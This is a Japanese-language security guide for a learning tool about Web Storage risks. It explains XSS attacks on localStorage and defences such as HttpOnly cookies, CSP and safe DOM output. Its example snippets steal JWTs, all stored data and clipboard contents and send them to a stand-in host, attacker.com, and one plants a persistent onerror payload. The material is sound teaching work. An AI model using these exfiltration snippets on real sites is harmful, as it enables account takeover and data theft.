# 🛡️ セキュリティリスクと対策

LocalStorage Playgroundで学習できるWebStorageのセキュリティ脅威と防御策について詳しく解説します。

---

## 🚨 XSSとlocalStorageの組み合わせ攻撃

### 攻撃シナリオ

#### 1. 基本的な攻撃パターン
```javascript
// XSS脆弱性を悪用して、localStorage内のトークンを盗む
<script>
  // JWTトークンの窃取
  const token = localStorage.getItem('jwt_token');
  const userData = localStorage.getItem('user_data');
  
  // 攻撃者のサーバーへ送信
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token, userData }),
  });
</script>
```

#### 2. 全データ窃取攻撃
```javascript
// localStorage内の全データを一括で盗む
<script>
  const allData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    allData[key] = localStorage.getItem(key);
  }
  
  // Base64エンコードして送信
  const img = new Image();
  img.src = `https://attacker.com/collect?data=${btoa(JSON.stringify(allData))}`;
</script>
```

#### 3. 持続的攻撃（Persistent XSS）
```javascript
// localStorageにマルウェアを仕込む
<script>
  // 悪意のあるコードをlocalStorageに保存
  localStorage.setItem('app_config', JSON.stringify({
    apiUrl: 'https://attacker.com/api',
    tracking: '<img src=x onerror="alert(document.cookie)">'
  }));
  
  // アプリケーションがこのデータを信頼して使用すると...
  // 継続的にXSSが発生する
</script>
```

### 実際の被害例

| 攻撃タイプ | 被害内容 | 影響度 |
|-----------|---------|--------|
| **認証トークン窃取** | JWTやセッショントークンが盗まれ、なりすましログインが可能に | 🔴 重大 |
| **個人情報漏洩** | ユーザー設定、プロファイル情報、操作履歴などが流出 | 🔴 重大 |
| **アカウント乗っ取り** | 認証情報を使って完全にアカウントを制御される | 🔴 重大 |
| **データ改ざん** | localStorage内のデータを書き換えられ、アプリの動作が異常に | 🟡 中程度 |
| **マルウェア埋め込み** | 永続的な悪意のあるコードが仕込まれる | 🔴 重大 |

---

## 🔗 関連する攻撃手法

本ツールはlocalStorage/sessionStorageに焦点を当てていますが、実際のXSS攻撃では以下の手法と組み合わされることがあります：

### 📋 クリップボード攻撃
```javascript
// ユーザーがコピーした機密情報（パスワード、秘密鍵等）を窃取
const clipboardData = await navigator.clipboard.readText();
fetch('https://attacker.com/steal-clipboard', {
  method: 'POST',
  body: clipboardData
});
```

### 🍪 Cookie窃取
```javascript
// HttpOnlyでないCookieを窃取
document.cookie; // "sessionid=abc123; preferences=dark"
```

### 📱 デバイス情報収集
```javascript
// ブラウザー・OS・画面解像度等の情報収集
navigator.userAgent;
screen.width + "x" + screen.height;
```

### 🎯 複合攻撃の例
実際の攻撃では、localStorage/sessionStorage、Cookie、クリップボード、デバイス情報を**同時に窃取**して攻撃者サーバーに送信することで、より大きな被害をもたらします。

⚠️ **重要:** 本ツールはWebストレージのセキュリティリスクの学習に特化していますが、実際のセキュリティ対策では、これらの関連攻撃も含めた包括的な防御策が必要です。

---

## ✅ 推奨される対策

### 1. 機密情報はlocalStorageに保存しない
```javascript
// ❌ 悪い例
localStorage.setItem('auth_token', token);

// ✅ 良い例 - HttpOnly Cookieを使用
// サーバー側で設定:
// Set-Cookie: auth_token=xxx; HttpOnly; Secure; SameSite=Strict
```

### 2. Content Security Policy (CSP) の実装
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

### 3. 入力をHTMLの文脈へ持ち込まない

エスケープ関数を足すより、入力をHTMLとして解釈させないほうが確実です。属性値・URL・イベント属性では必要なエスケープが変わるため、文脈ごとに書き分けが必要になり、そこが抜け道になります。

```javascript
// ❌ 悪い例 - 入力をHTMLとして解釈させている
element.innerHTML = '<span>' + userInput + '</span>';

// ✅ 良い例 - 文字として入れる
const span = document.createElement('span');
span.textContent = userInput;
element.replaceChildren(span);
```

本ツール自身がこの書き方だけで作られています。利用者が入力したキー・値・検索語を、HTML文字列やイベント属性へ渡している箇所はありません。

利用者が書いたHTMLを本当に描画する必要がある場合に限り、DOMPurifyのようなサニタイザーを検討します。描画の必要がないなら、入れないほうが安全です。

### 4. トークンの短期化と更新
```javascript
// トークンに有効期限を設定
const tokenData = {
  value: 'xxx',
  expires: Date.now() + (15 * 60 * 1000) // 15分
};
```

---

## 🛡️ セキュアな実装例

```javascript
// セキュアなストレージラッパーの実装
class SecureStorage {
  // 暗号化して保存（完全ではないが、単純な攻撃を防ぐ）
  static setItem(key, value, isPublic = false) {
    if (!isPublic && this.isSensitive(key)) {
      console.warn(`Warning: Storing potentially sensitive data in localStorage`);
      return false;
    }
    
    const data = {
      value: value,
      timestamp: Date.now(),
      checksum: this.generateChecksum(value)
    };
    
    localStorage.setItem(key, JSON.stringify(data));
  }
  
  // 改ざんチェック付きで取得
  static getItem(key) {
    const item = localStorage.getItem(key);
    if (!item) return null;
    
    const data = JSON.parse(item);
    if (this.generateChecksum(data.value) !== data.checksum) {
      console.error('Data tampering detected!');
      localStorage.removeItem(key);
      return null;
    }
    
    return data.value;
  }
  
  static isSensitive(key) {
    const sensitivePatterns = ['token', 'password', 'secret', 'key', 'auth'];
    return sensitivePatterns.some(pattern => 
      key.toLowerCase().includes(pattern)
    );
  }
  
  static generateChecksum(value) {
    // 簡易的なチェックサム（本番環境では適切なハッシュ関数を使用）
    return btoa(JSON.stringify(value)).slice(-10);
  }
}
```

---

⚠️ 上の例のチェックサムは、書き換えの事故に気づくための仕掛けであって、攻撃への対策ではありません。ページ上でスクリプトを実行できる攻撃者は、値を書き換えたうえでチェックサムも計算し直せます。同じ理由で、ブラウザーの中だけで完結する暗号化も、鍵が同じ場所にある以上は決め手になりません。

---

## 🔍 それぞれの防御が守る範囲

防御策は、それぞれ守る範囲が違います。混同すると「対策したのに破られた」ことになります。

| 防御 | 守るもの | 守らないもの |
|------|----------|--------------|
| HttpOnly Cookie | JavaScriptからトークンの値を読まれること | 攻撃者のスクリプトが利用者のブラウザー上で、そのCookieを添えてリクエストを送ること |
| SameSite Cookie | 別サイトからの意図しないリクエスト（CSRF） | 同じサイト上で動くXSS |
| CSP | 差し込まれたインラインスクリプトや外部スクリプトの実行 | 許可した経路を使う攻撃。差し込みの穴そのもの |
| 出力時の安全なDOM API | 入力がHTMLとして解釈されること | すでに保存されているデータが読まれること |
| Web Storageの同一オリジンポリシー | 別のオリジンからの読み取り | 同じオリジンで動くすべてのスクリプト |

Cookieへ移せばXSSの影響がゼロになるわけではなく、CSPだけでXSSを完全に防げるわけでもありません。**出力時に入力をHTMLの文脈へ持ち込まないことが先にあり、CSPはその上に重ねる備えです。**

---

## 🧰 本ツール自身の作り

学習用のツールであっても、そのツール自身に穴があっては筋が通りません。本ツールは次のようにしています。

- 利用者の入力（キー・値・検索語）を、HTML文字列・属性値・イベント属性・`eval`の文字列連結へ渡さない
- インラインの `onclick` と `style` 属性を使わない
- 外部のCDN・フォント・API・解析サービスを読み込まない

メタタグで指定しているCSPは次のとおりです。

```
default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self';
img-src 'self' data:; connect-src 'none'; base-uri 'self';
form-action 'self'; object-src 'none';
```

`'unsafe-eval'` だけを残しているのは、XSSデモが利用者の入力したスクリプトを `eval` で実行するためです。これはこのツールの目的そのものなので外せません。実行中は `window.alert`・`window.fetch`・`XMLHttpRequest`・`WebSocket`・`Image`・`navigator.sendBeacon` を差し替えて遮断し、正常に終わった場合も例外が出た場合も必ず元へ戻します。復元の手順は差し替えより先に定義してあります。

**meta要素のCSPで制御できないもの**があることに注意してください。`frame-ancestors`・`report-uri`・`sandbox` はHTTPヘッダーでしか効きません。GitHub Pagesのような静的ホスティングでは任意のヘッダーを付けられないため、本ツールではこれらを指定していません。埋め込みの制御が必要なサイトでは、サーバー側でヘッダーを返す必要があります。

---

## ⚠️ 重要な注意点

- **localStorage/sessionStorageは、XSS攻撃に対して無防備です**
- **JWTトークンやAPIキーなどの機密情報は絶対に保存しないでください**
- **HttpOnly Cookieを使用することで、JavaScriptからのアクセスを防げます**
- **定期的なセキュリティ監査とペネトレーションテストを実施してください**

---

## 🎯 本ツールでの実践学習

LocalStorage Playgroundでは、これらの攻撃と防御策を実際に体験できます：

### 🔴 攻撃デモ
- 基本的な攻撃（トークン窃取、セッションデータ窃取）
- 高度な攻撃（全データ列挙、JSON一括取得）
- 持続的攻撃（マルウェア埋め込み、外部送信攻撃）

### 🛡️ 防御デモ
- CSP (Content Security Policy) の効果確認
- HttpOnly Cookieの防御力比較
- 入力サニタイゼーション前後の比較

👉 **[デモページで実際に試す](https://ipusiron.github.io/localstorage-playground/)**